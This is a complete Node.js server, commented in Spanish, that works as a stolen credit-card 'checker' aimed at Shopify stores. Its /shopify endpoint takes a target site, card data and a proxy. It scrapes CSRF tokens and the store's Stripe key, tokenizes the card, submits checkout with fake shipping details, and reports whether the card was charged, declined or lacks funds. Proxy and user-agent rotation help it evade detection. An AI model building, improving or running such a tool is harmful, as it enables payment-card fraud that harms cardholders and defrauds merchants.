const express = require('express');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// ==========================================
// UTILIDADES
// ==========================================

function parseProxy(proxyStr) {
  if (!proxyStr) return null;
  const parts = proxyStr.split(':');
  if (parts.length === 4) {
    return {
      server: `http://${parts[0]}:${parts[1]}`,
      username: parts[2],
      password: parts[3]
    };
  } else if (parts.length === 2) {
    return { server: `http://${parts[0]}:${parts[1]}` };
  }
  return null;
}

function createProxyAgent(proxyConfig) {
  if (!proxyConfig) return undefined;
  const auth = proxyConfig.username ? `${proxyConfig.username}:${proxyConfig.password}@` : '';
  const url = `http://${auth}${proxyConfig.server.replace('http://', '')}`;
  return new HttpsProxyAgent(url);
}

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
];
const getRandomUA = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// ==========================================
// PASO 1: OBTENER VARIANT_ID
// ==========================================
async function getVariantIdByPrice(site, targetPrice, proxyAgent) {
  try {
    const response = await axios.get(`${site}/products.json?limit=250`, {
      headers: { 'User-Agent': getRandomUA(), 'Accept': 'application/json' },
      httpsAgent: proxyAgent,
      timeout: 15000
    });

    const products = response.data.products || [];
    if (products.length === 0) return null;

    if (!targetPrice || targetPrice <= 0) {
      return {
        variantId: products[0].variants[0].id,
        productHandle: products[0].handle,
        price: parseFloat(products[0].variants[0].price)
      };
    }

    let bestVariant = null;
    let bestProduct = null;
    let bestDiff = Infinity;

    for (const product of products) {
      for (const variant of product.variants) {
        if (!variant.available) continue;
        const price = parseFloat(variant.price);
        const diff = Math.abs(price - targetPrice);
        if (diff < bestDiff) {
          bestDiff = diff;
          bestVariant = variant;
          bestProduct = product;
        }
      }
    }

    if (!bestVariant) return null;
    return { variantId: bestVariant.id, productHandle: bestProduct.handle, price: parseFloat(bestVariant.price) };
  } catch (e) {
    return null;
  }
}

// ==========================================
// PASO 2: AÑADIR AL CARRITO (CON TOKEN CSRF)
// ==========================================
async function addToCart(site, productHandle, variantId, proxyAgent, cookieJar) {
  try {
    const client = wrapper(axios.create({ jar: cookieJar, httpsAgent: proxyAgent }));
    const ua = getRandomUA();

    // 1. Visitamos la página del producto
    const prodRes = await client.get(`${site}/products/${productHandle}`, {
      headers: {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.9'
      },
      timeout: 15000
    });

    const html = prodRes.data;

    // 2. Extraemos el Token CSRF oculto
    let csrfToken = '';
    const csrfMatch = html.match(/name="authenticity_token"\s+value="([^"]+)"/) || 
                      html.match(/value="([^"]+)"\s+name="authenticity_token"/);
    if (csrfMatch) {
      csrfToken = csrfMatch[1];
    }

    // 3. Preparamos los headers para el carrito
    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': ua,
      'Accept': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
      'Origin': site,
      'Referer': `${site}/products/${productHandle}`
    };

    // Si encontramos el token, lo añadimos
    if (csrfToken) {
      headers['X-CSRF-Token'] = csrfToken;
    }

    // 4. Enviamos el formulario al carrito
    const response = await client.post(`${site}/cart/add.js`, 
      new URLSearchParams({
        'form_type': 'product',
        'utf8': '✓',
        'quantity': '1',
        'id': variantId,
        'authenticity_token': csrfToken
      }).toString(),
      { headers, timeout: 15000 }
    );

    return response.status === 200;
  } catch (e) {
    console.log(`[addToCart] Error: ${e.response ? JSON.stringify(e.response.data).substring(0, 100) : e.message}`);
    return false;
  }
}

// ==========================================
// PASO 3: OBTENER CHECKOUT
// ==========================================
async function getCheckoutToken(site, proxyAgent, cookieJar) {
  try {
    const client = wrapper(axios.create({ jar: cookieJar, httpsAgent: proxyAgent }));
    const response = await client.get(`${site}/checkout`, {
      headers: { 'User-Agent': getRandomUA(), 'Accept': 'text/html' },
      timeout: 20000
    });

    const html = response.data;
    const tokenMatch = html.match(/"checkout_token"\s*:\s*"([^"]+)"/) || html.match(/"token"\s*:\s*"([^"]+)"/);
    const stripeKeyMatch = html.match(/pk_live_[A-Za-z0-9]+/) || html.match(/pk_test_[A-Za-z0-9]+/);
    
    return { 
      token: tokenMatch ? tokenMatch[1] : null, 
      stripeKey: stripeKeyMatch ? stripeKeyMatch[0] : null 
    };
  } catch (e) {
    return null;
  }
}

// ==========================================
// PASO 4: TOKENIZAR STRIPE
// ==========================================
async function tokenizeCard(cardNumber, month, year, cvv, stripeKey, proxyAgent) {
  try {
    const response = await axios.post('https://api.stripe.com/v1/payment_methods', 
      new URLSearchParams({
        'type': 'card',
        'card[number]': cardNumber,
        'card[exp_month]': month,
        'card[exp_year]': year,
        'card[cvc]': cvv,
        'billing_details[address][postal_code]': '10001',
        'billing_details[address][country]': 'US'
      }).toString(),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': `Bearer ${stripeKey}` },
        httpsAgent: proxyAgent, timeout: 15000
      }
    );
    return response.data.id;
  } catch (e) {
    return { error: e.response?.data?.error?.message || e.message };
  }
}

// ==========================================
// PASO 5: ENVIAR PAGO
// ==========================================
async function submitPayment(site, token, paymentMethodId, proxyAgent, cookieJar) {
  try {
    const client = wrapper(axios.create({ jar: cookieJar, httpsAgent: proxyAgent }));
    const response = await client.post(`${site}/checkout`, {
      checkout_token: token,
      payment_method_id: paymentMethodId,
      'checkout[email]': `test${Math.floor(Math.random() * 999999)}@gmail.com`,
      'checkout[shipping_address][first_name]': 'John',
      'checkout[shipping_address][last_name]': 'Doe',
      'checkout[shipping_address][address1]': '123 Main St',
      'checkout[shipping_address][city]': 'New York',
      'checkout[shipping_address][country]': 'United States',
      'checkout[shipping_address][province]': 'NY',
      'checkout[shipping_address][zip]': '10001',
      'checkout[shipping_address][phone]': '5555555555'
    }, {
      headers: {
        'Content-Type': 'application/json', 'User-Agent': getRandomUA(),
        'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest'
      },
      timeout: 30000
    });

    const data = response.data;
    if (data.order_id || data.order_status === 'paid') {
      return { Response: "Charged (Order Paid)", Status: true };
    }
    if (data.errors || data.error) {
      const errorMsg = JSON.stringify(data.errors || data.error);
      if (/insufficient/i.test(errorMsg)) return { Response: "Insufficient Funds", Status: false };
      if (/cvv/i.test(errorMsg)) return { Response: "Invalid CVV", Status: false };
      if (/3d/i.test(errorMsg)) return { Response: "3D Secure Required", Status: true };
      return { Response: `Declined (${errorMsg.substring(0, 50)})`, Status: false };
    }
    return { Response: "Declined (Unknown)", Status: false };
  } catch (e) {
    return { Response: `Declined (${e.response?.data ? JSON.stringify(e.response.data).substring(0, 50) : e.message})`, Status: false };
  }
}

// ==========================================
// FUNCIÓN PRINCIPAL
// ==========================================
async function checkCard(site, cc, targetPrice, proxyConfig) {
  try {
    let normalizedSite = site.startsWith('http') ? site : `https://${site}`;
    normalizedSite = normalizedSite.replace(/\/$/, '');

    const proxyAgent = createProxyAgent(proxyConfig);
    const cookieJar = new CookieJar();

    const productData = await getVariantIdByPrice(normalizedSite, targetPrice, proxyAgent);
    if (!productData) return { Response: "Site Error: No product found", Price: 0, Gateway: "Shopify", Status: false };

    const added = await addToCart(normalizedSite, productData.productHandle, productData.variantId, proxyAgent, cookieJar);
    if (!added) return { Response: "Site Error: Failed to add to cart", Price: productData.price, Gateway: "Shopify", Status: false };

    const checkoutData = await getCheckoutToken(normalizedSite, proxyAgent, cookieJar);
    if (!checkoutData || !checkoutData.token) return { Response: "Site Error: No checkout token", Price: productData.price, Gateway: "Shopify", Status: false };
    if (!checkoutData.stripeKey) return { Response: "Site Error: No Stripe key", Price: productData.price, Gateway: "Shopify", Status: false };

    const [cardNumber, month, year, cvv] = cc.split('|');
    const fullYear = year.length === 2 ? `20${year}` : year;
    const paymentMethodId = await tokenizeCard(cardNumber, month, fullYear, cvv, checkoutData.stripeKey, proxyAgent);
    
    if (typeof paymentMethodId === 'object' && paymentMethodId.error) {
      return { Response: `Declined (${paymentMethodId.error})`, Price: productData.price, Gateway: "Shopify", Status: false };
    }

    const result = await submitPayment(normalizedSite, checkoutData.token, paymentMethodId, proxyAgent, cookieJar);
    result.Price = productData.price;
    result.Gateway = "Shopify";
    return result;

  } catch (err) {
    return { Response: `Site Error: ${err.message}`, Price: 0, Gateway: "Shopify", Status: false };
  }
}

// ==========================================
// ENDPOINT
// ==========================================
app.all('/shopify', async (req, res) => {
  const { site, cc, proxy, price } = req.query;
  if (!site || !cc) return res.status(400).json({ Response: "Missing parameters", Price: 0, Gateway: "Unknown", Status: false });

  const result = await checkCard(site, cc, price ? parseFloat(price) : 0, parseProxy(proxy));
  res.json(result);
});

app.get('/health', (req, res) => res.json({ status: 'ok' }));
app.listen(PORT, () => console.log(`✅ Checker running`));
